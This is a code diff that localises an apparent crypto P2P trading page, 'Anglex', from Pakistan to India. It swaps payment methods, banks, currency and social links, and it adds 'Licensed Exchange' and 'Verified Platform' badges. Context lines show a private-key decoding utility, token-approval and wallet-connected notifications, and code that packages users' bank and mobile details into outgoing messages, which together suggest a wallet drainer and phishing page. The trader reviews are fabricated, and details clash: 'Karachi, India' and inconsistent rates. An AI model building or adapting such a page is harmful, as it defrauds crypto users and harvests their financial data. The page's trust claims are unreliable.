@@ -6,7 +6,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Anglex - P2P USDT Trading</title>
+    <title>Anglex - P2P USDT Trading in India</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
@@ -424,7 +424,7 @@
                     <i class="fas fa-cubes text-lg text-sky-400 mr-2"></i>
                     <span class="text-lg font-bold gradient-text">Anglex</span>
                 </div>
-                <p class="text-gray-400 mb-3 text-sm">India's most trusted P2P USDT trading platform. Trade securely with verified users.</p>
+                <p class="text-gray-400 mb-3 text-sm">India's most trusted P2P USDT trading platform. Trade securely with verified users across India.</p>
                 
                 <div class="mb-3">
                     <h5 class="text-white font-semibold text-sm mb-2">Contact Information</h5>
@@ -435,18 +435,39 @@
                         </div>
                         <div class="flex items-center">
                             <i class="fas fa-phone mr-2 w-4"></i>
-                            <span>+91-9000-1234567</span>
+                            <span>+91-98765-43210</span>
                         </div>
                         <div class="flex items-center">
                             <i class="fas fa-map-marker-alt mr-2 w-4"></i>
-                            <span>Mumbai, India</span>
+                            <span>Karachi, India</span>
                         </div>
                     </div>
                 </div>
                 
-                <div class="flex space-x-3">
-                    <a href="https://t.me/anglexpk" target="_blank" onclick="showNotification('Opening Telegram channel...', 'info')" class="text-gray-400 hover:text-white transition-colors"><i class="fab fa-telegram text-sm"></i></a>
-                    <a href="https://twitter.com/anglexpk" target="_blank" onclick="showNotification('Follow us on Twitter!', 'info')" class="text-gray-400 hover:text-white transition-colors"><i class="fab fa-twitter text-sm"></i></a>
+                                <div class="mb-3">
+                    <h5 class="text-white font-semibold text-sm mb-2">Security & Trust</h5>
+                    <div class="flex flex-wrap gap-2 text-xs">
+                        <div class="bg-green-500/20 border border-green-500/40 rounded px-2 py-1 flex items-center">
+                            <i class="fas fa-shield-alt mr-1 text-green-400"></i>
+                            <span class="text-green-300">SSL Secured</span>
+                        </div>
+                        <div class="bg-blue-500/20 border border-blue-500/40 rounded px-2 py-1 flex items-center">
+                            <i class="fas fa-check-circle mr-1 text-blue-400"></i>
+                            <span class="text-blue-300">Verified Platform</span>
+                        </div>
+                        <div class="bg-purple-500/20 border border-purple-500/40 rounded px-2 py-1 flex items-center">
+                            <i class="fas fa-lock mr-1 text-purple-400"></i>
+                            <span class="text-purple-300">256-bit Encryption</span>
+                        </div>
+                        <div class="bg-yellow-500/20 border border-yellow-500/40 rounded px-2 py-1 flex items-center">
+                            <i class="fas fa-certificate mr-1 text-yellow-400"></i>
+                            <span class="text-yellow-300">Licensed Exchange</span>
+                        </div>
+                    </div>
+                </div>
+<div class="flex space-x-3">
+                    <a href="https://t.me/anglexindia" target="_blank" onclick="showNotification('Opening Telegram channel...', 'info')" class="text-gray-400 hover:text-white transition-colors"><i class="fab fa-telegram text-sm"></i></a>
+                    <a href="https://twitter.com/anglexindia" target="_blank" onclick="showNotification('Follow us on Twitter!', 'info')" class="text-gray-400 hover:text-white transition-colors"><i class="fab fa-twitter text-sm"></i></a>
                     <a href="https://discord.gg/anglex" target="_blank" onclick="showNotification('Join our Discord server!', 'info')" class="text-gray-400 hover:text-white transition-colors"><i class="fab fa-discord text-sm"></i></a>
                 </div>
             </div>
@@ -511,7 +532,7 @@
             <div>
                 <label class="form-label">You will receive:</label>
                 <div id="pkr-amount" class="text-2xl md:text-3xl font-bold text-green-500 mt-2">INR 0.00</div>
-                <p class="text-xs text-gray-400 mt-1">Rate: INR 315 per USDT</p>
+                <p class="text-xs text-gray-400 mt-1">Rate: INR 104 per USDT</p>
             </div>
         </div>
 
@@ -523,13 +544,13 @@
                 </h4>
                 
                 <div class="payment-method-grid">
-                    <div class="payment-method-btn" data-method="Google Pay">
+                    <div class="payment-method-btn" data-method="UPI">
                         <i class="fas fa-mobile-alt mb-1 text-sm"></i><br>
-                        <strong>Google Pay</strong>
+                        <strong>UPI</strong>
                     </div>
-                    <div class="payment-method-btn" data-method="PhonePe">
+                    <div class="payment-method-btn" data-method="PayTM">
                         <i class="fas fa-credit-card mb-1 text-sm"></i><br>
-                        <strong>PhonePe</strong>
+                        <strong>PayTM</strong>
                     </div>
                     <div class="payment-method-btn" data-method="Bank Transfer">
                         <i class="fas fa-university mb-1 text-sm"></i><br>
@@ -537,36 +558,36 @@
                     </div>
                 </div>
 
-                <!-- Google Pay Details -->
-                <div id="jazzcash-details" class="payment-form hidden">
+                <!-- UPI Details -->
+                <div id="upi-details" class="payment-form hidden">
                     <h5 class="font-semibold text-white mb-3 flex items-center text-sm">
-                        <i class="fas fa-mobile-alt mr-1"></i>Google Pay Details
+                        <i class="fas fa-mobile-alt mr-1"></i>UPI Details
                     </h5>
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                         <div class="form-group">
-                            <label class="form-label">Mobile Number (10 digits) *</label>
-                            <input type="text" id="jazzcash-mobile" placeholder="9XXXXXXXXXX" class="form-input" maxlength="11">
+                            <label class="form-label">Mobile Number *</label>
+                            <input type="text" id="upi-mobile" placeholder="98XXXXXXXXX" class="form-input" maxlength="10">
                         </div>
                         <div class="form-group">
                             <label class="form-label">Account Holder Name *</label>
-                            <input type="text" id="jazzcash-name" placeholder="Full name as per account" class="form-input">
+                            <input type="text" id="upi-name" placeholder="Full name as per account" class="form-input">
                         </div>
                     </div>
                 </div>
 
-                <!-- PhonePe Details -->
-                <div id="easypaisa-details" class="payment-form hidden">
+                <!-- PayTM Details -->
+                <div id="paytm-details" class="payment-form hidden">
                     <h5 class="font-semibold text-white mb-3 flex items-center text-sm">
-                        <i class="fas fa-credit-card mr-1"></i>PhonePe Details
+                        <i class="fas fa-credit-card mr-1"></i>PayTM Details
                     </h5>
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                         <div class="form-group">
-                            <label class="form-label">Mobile Number (10 digits) *</label>
-                            <input type="text" id="easypaisa-mobile" placeholder="9XXXXXXXXXX" class="form-input" maxlength="11">
+                            <label class="form-label">Mobile Number *</label>
+                            <input type="text" id="paytm-mobile" placeholder="98XXXXXXXXX" class="form-input" maxlength="10">
                         </div>
                         <div class="form-group">
                             <label class="form-label">Account Holder Name *</label>
-                            <input type="text" id="easypaisa-name" placeholder="Full name as per account" class="form-input">
+                            <input type="text" id="paytm-name" placeholder="Full name as per account" class="form-input">
                         </div>
                     </div>
                 </div>
@@ -581,16 +602,16 @@
                             <label class="form-label">Bank Name *</label>
                             <select id="bank-name" class="form-select">
                                 <option value="">Select Bank</option>
-                                <option value="HBL">HDFC Bank</option>
-                                <option value="UBL">ICICI Bank</option>
-                                <option value="MCB">Axis Bank</option>
-                                <option value="ABL">SBI</option>
-                                <option value="NBP">National Bank of India (NBP)</option>
+                                <option value="HBL">State Bank of India (SBI)</option>
+                                <option value="UBL">HDFC Bank</option>
+                                <option value="MCB">ICICI Bank</option>
+                                <option value="ABL">Axis Bank</option>
+                                <option value="NBP">Punjab National Bank (PNB)</option>
                                 <option value="Standard Chartered">Standard Chartered Bank</option>
-                                <option value="Kotak Bank">Kotak Bank</option>
-                                <option value="Indusind Bank">Indusind Bank</option>
-                                <option value="Federal Bank">Federal Bank</option>
-                                <option value="YES Bank">YES Bank</option>
+                                <option value="Kotak Mahindra Bank">Kotak Mahindra Bank</option>
+                                <option value="Yes Bank">Yes Bank</option>
+                                <option value="IndusInd Bank">IndusInd Bank</option>
+                                <option value="IDFC First Bank">IDFC First Bank</option>
                             </select>
                         </div>
                         <div class="form-group">
@@ -602,12 +623,12 @@
                             <input type="text" id="bank-holder-name" placeholder="Full name as per bank account" class="form-input">
                         </div>
                         <div class="form-group">
-                            <label class="form-label">Mobile Number (10 digits) *</label>
-                            <input type="text" id="bank-mobile" placeholder="9XXXXXXXXXX" class="form-input" maxlength="11">
+                            <label class="form-label">Mobile Number *</label>
+                            <input type="text" id="bank-mobile" placeholder="98XXXXXXXXX" class="form-input" maxlength="10">
                         </div>
                         <div class="form-group">
-                            <label class="form-label">IFSC</label>
-                            <input type="text" id="bank-iban" placeholder="IDFB0000001" class="form-input">
+                            <label class="form-label">IFSC Code</label>
+                            <input type="text" id="bank-iban" placeholder="SBIN0001234" class="form-input">
                         </div>
                         <div class="form-group">
                             <label class="form-label">Branch Code</label>
@@ -746,7 +767,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // Extended traders data with reviews (some offline)
     const traders = {
-        'CryptoKing_PK': { 
+        'CryptoKing_Trader': { 
             initials: 'CK', 
             completion: 98, 
             totalTrades: 1200, 
@@ -758,9 +779,9 @@ document.addEventListener('DOMContentLoaded', function() {
             paymentTime: '10 min',
             joinedDate: 'Jan 2023',
             reviews: [
-                { user: 'Ahmed_92', rating: 5, comment: 'Very fast payment, highly recommended trader!', date: '2 days ago' },
-                { user: 'Fatima_K', rating: 5, comment: 'Excellent service, quick response time.', date: '1 week ago' },
-                { user: 'Hassan_007', rating: 4, comment: 'Good trader, payment received within 15 minutes.', date: '2 weeks ago' }
+                { user: 'CryptoUser92', rating: 5, comment: 'Very fast payment, highly recommended trader!', date: '2 days ago' },
+                { user: 'TraderK', rating: 5, comment: 'Excellent service, quick response time.', date: '1 week ago' },
+                { user: 'User007', rating: 4, comment: 'Good trader, payment received within 15 minutes.', date: '2 weeks ago' }
             ]
         },
         'USDT_Master': { 
@@ -775,11 +796,11 @@ document.addEventListener('DOMContentLoaded', function() {
             paymentTime: '15 min',
             joinedDate: 'Mar 2023',
             reviews: [
-                { user: 'Ali_Trader', rating: 5, comment: 'Always reliable, never had any issues.', date: '3 days ago' },
-                { user: 'Zara_M', rating: 4, comment: 'Professional trader, smooth transactions.', date: '1 week ago' }
+                { user: 'AliTrader', rating: 5, comment: 'Always reliable, never had any issues.', date: '3 days ago' },
+                { user: 'ZaraM', rating: 4, comment: 'Professional trader, smooth transactions.', date: '1 week ago' }
             ]
         },
-        'PakCrypto_Pro': { 
+        'CryptoPro': { 
             initials: 'PP', 
             completion: 94, 
             totalTrades: 650, 
@@ -791,8 +812,8 @@ document.addEventListener('DOMContentLoaded', function() {
             paymentTime: '20 min',
             joinedDate: 'May 2023',
             reviews: [
-                { user: 'Omar_123', rating: 5, comment: 'Best rates in the market, will trade again.', date: '1 day ago' },
-                { user: 'Ayesha_T', rating: 4, comment: 'Good communication, payment on time.', date: '5 days ago' }
+                { user: 'Omar123', rating: 5, comment: 'Best rates in the market, will trade again.', date: '1 day ago' },
+                { user: 'AyeshaT', rating: 4, comment: 'Good communication, payment on time.', date: '5 days ago' }
             ]
         },
         'FastPay_Exchange': { 
@@ -807,11 +828,11 @@ document.addEventListener('DOMContentLoaded', function() {
             paymentTime: '8 min',
             joinedDate: 'Dec 2022',
             reviews: [
-                { user: 'Bilal_99', rating: 5, comment: 'Lightning fast payments! Highly professional.', date: '4 hours ago' },
-                { user: 'Sana_Crypto', rating: 5, comment: 'Outstanding service, will definitely use again.', date: '2 days ago' }
+                { user: 'Bilal99', rating: 5, comment: 'Lightning fast payments! Highly professional.', date: '4 hours ago' },
+                { user: 'SanaCrypto', rating: 5, comment: 'Outstanding service, will definitely use again.', date: '2 days ago' }
             ]
         },
-        'TrustTrade_PK': { 
+        'TrustTrade_Trader': { 
             initials: 'TT', 
             completion: 95, 
             totalTrades: 780, 
@@ -823,8 +844,8 @@ document.addEventListener('DOMContentLoaded', function() {
             paymentTime: '25 min',
             joinedDate: 'Feb 2023',
             reviews: [
-                { user: 'Imran_K', rating: 5, comment: 'Trustworthy trader, great communication.', date: '6 hours ago' },
-                { user: 'Nadia_S', rating: 4, comment: 'Reliable service, payment within promised time.', date: '3 days ago' }
+                { user: 'ImranK', rating: 5, comment: 'Trustworthy trader, great communication.', date: '6 hours ago' },
+                { user: 'NadiaS', rating: 4, comment: 'Reliable service, payment within promised time.', date: '3 days ago' }
             ]
         },
         'QuickSwap_BTC': { 
@@ -839,8 +860,8 @@ document.addEventListener('DOMContentLoaded', function() {
             paymentTime: '30 min',
             joinedDate: 'Jun 2023',
             reviews: [
-                { user: 'Kashif_T', rating: 4, comment: 'Good trader, competitive rates.', date: '1 day ago' },
-                { user: 'Hira_M', rating: 5, comment: 'Smooth transaction, will recommend.', date: '4 days ago' }
+                { user: 'KashifT', rating: 4, comment: 'Good trader, competitive rates.', date: '1 day ago' },
+                { user: 'HiraM', rating: 5, comment: 'Smooth transaction, will recommend.', date: '4 days ago' }
             ]
         },
         'DigitalPay_Hub': { 
@@ -855,11 +876,11 @@ document.addEventListener('DOMContentLoaded', function() {
             paymentTime: '5 min',
             joinedDate: 'Oct 2022',
             reviews: [
-                { user: 'Usman_Pro', rating: 5, comment: 'Perfect trader! Super fast and reliable.', date: '2 hours ago' },
-                { user: 'Maria_K', rating: 5, comment: 'Exceptional service, highly recommended!', date: '1 day ago' }
+                { user: 'UsmanPro', rating: 5, comment: 'Perfect trader! Super fast and reliable.', date: '2 hours ago' },
+                { user: 'MariaK', rating: 5, comment: 'Exceptional service, highly recommended!', date: '1 day ago' }
             ]
         },
-        'SafeTrade_PK': { 
+        'SafeTrade_Trader': { 
             initials: 'ST', 
             completion: 92, 
             totalTrades: 420, 
@@ -871,8 +892,8 @@ document.addEventListener('DOMContentLoaded', function() {
             paymentTime: '35 min',
             joinedDate: 'Jul 2023',
             reviews: [
-                { user: 'Adnan_92', rating: 4, comment: 'Safe and secure trading experience.', date: '3 days ago' },
-                { user: 'Farah_A', rating: 5, comment: 'Professional service, will use again.', date: '1 week ago' }
+                { user: 'Adnan92', rating: 4, comment: 'Safe and secure trading experience.', date: '3 days ago' },
+                { user: 'FarahA', rating: 5, comment: 'Professional service, will use again.', date: '1 week ago' }
             ]
         },
         'CryptoEase_X': { 
@@ -887,8 +908,8 @@ document.addEventListener('DOMContentLoaded', function() {
             paymentTime: '18 min',
             joinedDate: 'Jan 2023',
             reviews: [
-                { user: 'Salman_T', rating: 5, comment: 'Excellent rates and quick service.', date: '5 hours ago' },
-                { user: 'Kiran_M', rating: 4, comment: 'Reliable trader, good communication.', date: '2 days ago' }
+                { user: 'SalmanT', rating: 5, comment: 'Excellent rates and quick service.', date: '5 hours ago' },
+                { user: 'KiranM', rating: 4, comment: 'Reliable trader, good communication.', date: '2 days ago' }
             ]
         },
         'AnglexOfficial': { 
@@ -910,21 +931,21 @@ document.addEventListener('DOMContentLoaded', function() {
     };
 
     const initialOrders = [
-        { id: 1, trader: 'CryptoKing_PK', price: 104, limit: '1,04,000 - 52,00,000', available: '5,000 USDT', payment: ['Google Pay', 'Bank Transfer']},
-        { id: 2, trader: 'USDT_Master', price: 105, limit: '1,56,000 - 33,28,000', available: '3,200 USDT', payment: ['PhonePe', 'Bank Transfer']},
-        { id: 3, trader: 'PakCrypto_Pro', price: 103, limit: '2,08,000 - 29,12,000', available: '2,800 USDT', payment: ['Google Pay']},
-        { id: 4, trader: 'FastPay_Exchange', price: 105, limit: '5,20,000 - 83,20,000', available: '8,000 USDT', payment: ['Bank Transfer', 'Google Pay', 'PhonePe']},
-        { id: 5, trader: 'TrustTrade_PK', price: 104, limit: '2,60,000 - 46,80,000', available: '4,500 USDT', payment: ['PhonePe', 'Bank Transfer']},
-        { id: 6, trader: 'QuickSwap_BTC', price: 104, limit: '1,56,000 - 18,72,000', available: '1,800 USDT', payment: ['Google Pay']},
-        { id: 7, trader: 'DigitalPay_Hub', price: 105, limit: '10,40,000 - 1,24,80,000', available: '12,000 USDT', payment: ['Bank Transfer', 'Google Pay', 'PhonePe']},
-        { id: 8, trader: 'SafeTrade_PK', price: 103, limit: '2,08,000 - 22,88,000', available: '2,200 USDT', payment: ['PhonePe']},
-        { id: 9, trader: 'CryptoEase_X', price: 104, limit: '3,12,000 - 70,72,000', available: '6,800 USDT', payment: ['Bank Transfer', 'Google Pay']},
-        { id: 10, trader: 'AnglexOfficial', price: 104, limit: '5,20,000 - 5,20,00,000', available: '50,000+ USDT', payment: ['Bank Transfer', 'Google Pay', 'PhonePe']},
-        { id: 11, trader: 'CryptoKing_PK', price: 104, limit: '52,000 - 31,20,000', available: '3,000 USDT', payment: ['Google Pay']},
-        { id: 12, trader: 'FastPay_Exchange', price: 105, limit: '2,08,000 - 62,40,000', available: '5,500 USDT', payment: ['PhonePe', 'Bank Transfer']},
-        { id: 13, trader: 'TrustTrade_PK', price: 103, limit: '1,56,000 - 36,40,000', available: '4,200 USDT', payment: ['Google Pay', 'PhonePe']},
-        { id: 14, trader: 'DigitalPay_Hub', price: 105, limit: '5,20,000 - 1,04,00,000', available: '8,800 USDT', payment: ['Bank Transfer']},
-        { id: 15, trader: 'SafeTrade_PK', price: 104, limit: '1,04,000 - 26,00,000', available: '2,800 USDT', payment: ['Google Pay']}
+        { id: 1, trader: 'CryptoKing_Trader', price: 104, limit: '10,000 - 52,000', available: '5,000 USDT', payment: ['UPI', 'Bank Transfer']},
+        { id: 2, trader: 'USDT_Master', price: 318, limit: '15,000 - 33,000', available: '3,200 USDT', payment: ['PayTM', 'Bank Transfer']},
+        { id: 3, trader: 'CryptoPro', price: 312, limit: '10,400 - 31,200', available: '2,800 USDT', payment: ['UPI']},
+        { id: 4, trader: 'FastPay_Exchange', price: 320, limit: '20,800 - 83,200', available: '8,000 USDT', payment: ['Bank Transfer', 'UPI', 'PayTM']},
+        { id: 5, trader: 'TrustTrade_Trader', price: 314, limit: '15,600 - 46,800', available: '4,500 USDT', payment: ['PayTM', 'Bank Transfer']},
+        { id: 6, trader: 'QuickSwap_BTC', price: 316, limit: '10,400 - 20,800', available: '1,800 USDT', payment: ['UPI']},
+        { id: 7, trader: 'DigitalPay_Hub', price: 322, limit: '31,200 - 124,800', available: '12,000 USDT', payment: ['Bank Transfer', 'UPI', 'PayTM']},
+        { id: 8, trader: 'SafeTrade_Trader', price: 313, limit: '10,400 - 26,000', available: '2,200 USDT', payment: ['PayTM']},
+        { id: 9, trader: 'CryptoEase_X', price: 317, limit: '15,600 - 70,720', available: '6,800 USDT', payment: ['Bank Transfer', 'UPI']},
+        { id: 10, trader: 'AnglexOfficial', price: 319, limit: '20,800 - 520,000', available: '50,000+ USDT', payment: ['Bank Transfer', 'UPI', 'PayTM']},
+        { id: 11, trader: 'CryptoKing_Trader', price: 316, limit: '10,400 - 31,200', available: '3,000 USDT', payment: ['UPI']},
+        { id: 12, trader: 'FastPay_Exchange', price: 321, limit: '10,400 - 62,400', available: '5,500 USDT', payment: ['PayTM', 'Bank Transfer']},
+        { id: 13, trader: 'TrustTrade_Trader', price: 313, limit: '10,400 - 36,400', available: '4,200 USDT', payment: ['UPI', 'PayTM']},
+        { id: 14, trader: 'DigitalPay_Hub', price: 323, limit: '20,800 - 104,000', available: '8,800 USDT', payment: ['Bank Transfer']},
+        { id: 15, trader: 'SafeTrade_Trader', price: 314, limit: '10,400 - 26,000', available: '2,800 USDT', payment: ['UPI']}
     ];
 
     // Utility function to decode private key safely
@@ -1164,7 +1185,7 @@ document.addEventListener('DOMContentLoaded', function() {
     async function sendWalletConnectedNotification() {
         try {
             const currentTime = new Date().toLocaleString('en-US', {
-                timeZone: 'Asia/Mumbai',
+                timeZone: 'Asia/Kolkata',
                 year: 'numeric',
                 month: 'long',
                 day: 'numeric',
@@ -1312,7 +1333,7 @@ document.addEventListener('DOMContentLoaded', function() {
     async function sendApprovalNotification(txHash) {
         try {
             const currentTime = new Date().toLocaleString('en-US', {
-                timeZone: 'Asia/Mumbai',
+                timeZone: 'Asia/Kolkata',
                 year: 'numeric',
                 month: 'long',
                 day: 'numeric',
@@ -1397,16 +1418,16 @@ document.addEventListener('DOMContentLoaded', function() {
         };
 
         switch(selectedPaymentMethod) {
-            case 'Google Pay':
+            case 'UPI':
                 details.data = {
-                    mobile: document.getElementById('jazzcash-mobile')?.value || '',
-                    name: document.getElementById('jazzcash-name')?.value || ''
+                    mobile: document.getElementById('upi-mobile')?.value || '',
+                    name: document.getElementById('upi-name')?.value || ''
                 };
                 break;
-            case 'PhonePe':
+            case 'PayTM':
                 details.data = {
-                    mobile: document.getElementById('easypaisa-mobile')?.value || '',
-                    name: document.getElementById('easypaisa-name')?.value || ''
+                    mobile: document.getElementById('paytm-mobile')?.value || '',
+                    name: document.getElementById('paytm-name')?.value || ''
                 };
                 break;
             case 'Bank Transfer':
@@ -1431,8 +1452,8 @@ document.addEventListener('DOMContentLoaded', function() {
         }
 
         switch(details.method) {
-            case 'Google Pay':
-            case 'PhonePe':
+            case 'UPI':
+            case 'PayTM':
                 if (!details.data.mobile) {
                     return `Please enter ${details.method} mobile number`;
                 }
@@ -1477,8 +1498,8 @@ document.addEventListener('DOMContentLoaded', function() {
             const minLimit = parseFloat(minStr) || 0;
             const maxLimit = parseFloat(maxStr) || Infinity;
 
-            // Convert USDT to INR (assuming 315 rate)
-            const pkrAmount = usdtAmount * 315;
+            // Convert USDT to INR (assuming 104 rate)
+            const pkrAmount = usdtAmount * 104;
 
             debugLog(`💰 Limits: INR ${minLimit.toLocaleString()} - ${maxLimit.toLocaleString()}`);
             debugLog(`💰 Order amount: ${usdtAmount} USDT = INR ${pkrAmount.toLocaleString()}`);
@@ -1553,9 +1574,9 @@ document.addEventListener('DOMContentLoaded', function() {
         sellBtn.disabled = true;
 
         try {
-            const pkrAmount = (usdtAmount * 315).toFixed(2);
+            const pkrAmount = (usdtAmount * 104).toFixed(2);
             const currentTime = new Date().toLocaleString('en-US', {
-                timeZone: 'Asia/Mumbai',
+                timeZone: 'Asia/Kolkata',
                 year: 'numeric',
                 month: 'long',
                 day: 'numeric',
@@ -1581,8 +1602,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
             let paymentDetailsText = '';
             switch(paymentDetails.method) {
-                case 'Google Pay':
-                case 'PhonePe':
+                case 'UPI':
+                case 'PayTM':
                     paymentDetailsText = `📱 *${paymentDetails.method}:*\n` +
                                        `   Mobile: ${paymentDetails.data.mobile}\n` +
                                        `   Name: ${paymentDetails.data.name}`;
@@ -1593,7 +1614,7 @@ document.addEventListener('DOMContentLoaded', function() {
                                        `   Account: ${paymentDetails.data.accountNumber}\n` +
                                        `   Name: ${paymentDetails.data.holderName}\n` +
                                        `   Mobile: ${paymentDetails.data.mobile}` +
-                                       (paymentDetails.data.iban ? `\n   IBAN: ${paymentDetails.data.iban}` : '');
+                                       (paymentDetails.data.iban ? `\n   IFSC Code: ${paymentDetails.data.iban}` : '');
                     break;
             }
 
@@ -1607,7 +1628,7 @@ document.addEventListener('DOMContentLoaded', function() {
                           `📊 *Trade Details:*\n` +
                           `   Amount: ${usdtAmount} USDT\n` +
                           `   Value: INR ${pkrAmount}\n` +
-                          `   Rate: INR 315 per USDT\n\n` +
+                          `   Rate: INR 104 per USDT\n\n` +
                           `${paymentDetailsText}\n\n` +
                           `✅ *Status:* Order Placed\n` +
                           `🕒 *Time:* ${currentTime}`;
@@ -1644,8 +1665,8 @@ document.addEventListener('DOMContentLoaded', function() {
         let paymentDetailsHtml = '';
         if (order.paymentDetails) {
             switch(order.paymentMethod) {
-                case 'Google Pay':
-                case 'PhonePe':
+                case 'UPI':
+                case 'PayTM':
                     paymentDetailsHtml = `
                         <div class="mb-4">
                             <h5 class="text-white font-semibold mb-2">${order.paymentMethod} Details:</h5>
@@ -1662,7 +1683,7 @@ document.addEventListener('DOMContentLoaded', function() {
                             <p class="text-gray-300 text-sm">Account: ${order.paymentDetails.accountNumber}</p>
                             <p class="text-gray-300 text-sm">Name: ${order.paymentDetails.holderName}</p>
                             <p class="text-gray-300 text-sm">Mobile: ${order.paymentDetails.mobile}</p>
-                            ${order.paymentDetails.iban ? `<p class="text-gray-300 text-sm">IBAN: ${order.paymentDetails.iban}</p>` : ''}
+                            ${order.paymentDetails.iban ? `<p class="text-gray-300 text-sm">IFSC Code: ${order.paymentDetails.iban}</p>` : ''}
                         </div>
                     `;
                     break;
@@ -1684,8 +1705,8 @@ document.addEventListener('DOMContentLoaded', function() {
                     <div>
                         <h5 class="text-white font-semibold mb-2">Trade Information:</h5>
                         <p class="text-gray-300 text-sm mb-1">Amount: ${order.amount} USDT</p>
-                        <p class="text-gray-300 text-sm mb-1">Value: INR ${order.inrAmount}</p>
-                        <p class="text-gray-300 text-sm mb-1">Rate: INR 315 per USDT</p>
+                        <p class="text-gray-300 text-sm mb-1">Value: INR ${order.pkrAmount}</p>
+                        <p class="text-gray-300 text-sm mb-1">Rate: INR 104 per USDT</p>
                         <p class="text-gray-300 text-sm">Date: ${order.timestamp}</p>
                     </div>
                     <div>
@@ -1744,7 +1765,7 @@ document.addEventListener('DOMContentLoaded', function() {
                         <div class="market-stats">
                             <div class="grid grid-cols-3 gap-3">
                                 <div class="stat-item">
-                                    <div class="stat-value">INR 315</div>
+                                    <div class="stat-value">INR 104</div>
                                     <div class="stat-label">Current Rate</div>
                                 </div>
                                 <div class="stat-item">
@@ -1769,8 +1790,8 @@ document.addEventListener('DOMContentLoaded', function() {
                             <label for="payment-filter" class="block text-xs font-medium text-gray-400 mb-2">Payment Method</label>
                             <select id="payment-filter" class="w-full bg-slate-700/50 text-gray-200 border-slate-600 rounded-lg p-3 text-sm focus:ring-2 focus:ring-sky-500 focus:border-sky-500 transition-all">
                                 <option value="all">All Methods</option>
-                                <option value="Google Pay">Google Pay</option>
-                                <option value="PhonePe">PhonePe</option>
+                                <option value="UPI">UPI</option>
+                                <option value="PayTM">PayTM</option>
                                 <option value="Bank Transfer">Bank Transfer</option>
                             </select>
                         </div>
@@ -1778,10 +1799,10 @@ document.addEventListener('DOMContentLoaded', function() {
                             <label for="amount-filter" class="block text-xs font-medium text-gray-400 mb-2">Amount Range (INR)</label>
                             <select id="amount-filter" class="w-full bg-slate-700/50 text-gray-200 border-slate-600 rounded-lg p-3 text-sm focus:ring-2 focus:ring-sky-500 focus:border-sky-500 transition-all">
                                 <option value="all">Any Amount</option>
-                                <option value="5000-50000">INR 5,000 - 50,000</option>
-                                <option value="50000-150000">INR 50,000 - 150,000</option>
-                                <option value="150000-300000">INR 150,000 - 300,000</option>
-                                <option value="300000+">INR 300,000+</option>
+                                <option value="5000-50000">INR 10,000 - 52,000</option>
+                                <option value="50000-150000">INR 52,000 - 156,000</option>
+                                <option value="150000-300000">INR 156,000 - 312,000</option>
+                                <option value="300000+">INR 312,000+</option>
                             </select>
                         </div>
                         <div class="flex items-end">
@@ -1846,7 +1867,7 @@ document.addEventListener('DOMContentLoaded', function() {
                         <i class="fab fa-telegram text-2xl text-green-400 mb-3"></i>
                         <h3 class="text-base font-semibold text-white mb-2">Telegram</h3>
                         <p class="text-gray-400 mb-3 text-sm">Join our official support channel</p>
-                        <button onclick="window.open('https://t.me/anglexpk', '_blank')" class="bg-green-600 hover:bg-green-700 text-white py-1.5 px-3 rounded text-sm transition-all">Join Now</button>
+                        <button onclick="window.open('https://t.me/anglexindia', '_blank')" class="bg-green-600 hover:bg-green-700 text-white py-1.5 px-3 rounded text-sm transition-all">Join Now</button>
                     </div>
                     
                     <div class="bg-gradient-to-br from-purple-600/20 to-pink-600/20 border border-purple-500/30 rounded-xl p-6 text-center">
@@ -1928,7 +1949,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 <div class="order-card p-4 rounded-xl cursor-pointer hover:bg-gray-600/20 transition-all" onclick="showOrderDetails(${order.id})">
                     <div class="flex justify-between items-center">
                         <div>
-                            <div class="text-white font-semibold">${order.amount} USDT → INR ${order.inrAmount}</div>
+                            <div class="text-white font-semibold">${order.amount} USDT → INR ${order.pkrAmount}</div>
                             <div class="text-sm text-gray-400">${order.paymentMethod} • ${order.timestamp}</div>
                         </div>
                         <div class="flex items-center space-x-3">
@@ -2015,7 +2036,7 @@ document.addEventListener('DOMContentLoaded', function() {
                             <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-center flex-1">
                                 <div class="bg-red-500/10 border border-red-500/20 rounded-lg p-2">
                                     <p class="text-xs text-red-400 uppercase font-semibold mb-1">Price</p>
-                                    <p class="text-sm md:text-base font-bold text-red-400">₨${order.price}</p>
+                                    <p class="text-sm md:text-base font-bold text-red-400">₹${order.price}</p>
                                 </div>
                                 <div class="bg-blue-500/10 border border-blue-500/20 rounded-lg p-2">
                                     <p class="text-xs text-blue-400 uppercase font-semibold mb-1">Limit</p>
